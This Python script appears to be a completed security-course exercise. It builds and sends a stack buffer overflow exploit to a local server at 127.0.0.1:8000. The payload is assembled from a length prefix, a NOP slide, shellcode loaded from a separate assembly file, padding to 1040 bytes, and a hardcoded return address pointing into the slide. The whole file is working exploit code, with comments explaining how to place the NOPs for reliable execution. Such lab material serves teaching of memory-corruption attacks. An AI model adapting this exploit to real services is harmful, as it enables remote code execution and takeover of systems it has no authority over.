#!/usr/bin/python

import os, socket, struct, assemble


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    ass = assemble.assemble_file(PATH_TO_SHELLCODE)
    return ass


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    desired_shell_length = 1040 # as explained in q1
    nop = '\x90'
    address_to_return = "\xdc\xdd\xff\xbf" # this is the address in the middle of the NOPs slide
    shellcode = get_shellcode() # get our pure shellcode logic
    shellcode_length = len(shellcode) 
    slide_nops = nop * 100
    # using all the NOPs at the begining causes us problems with the stack location during the shellcode execution
    # so we won't add all our NOPs in the begining of the message but add a small NOPs slide at the begining
    # rest of the nops will be at the end of the shellcode itself
    slide_nops_len = len(slide_nops)

    # full structe - small slide NOPs, shellcode, rest of NOPs, address to return
    message = slide_nops + shellcode + nop * (desired_shell_length - shellcode_length - slide_nops_len) + address_to_return
    message_length = len(message)
    message_length_newtork_order = struct.pack('>L', message_length) # add size as in q1

    return message_length_newtork_order + message # return payoload - message + size


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
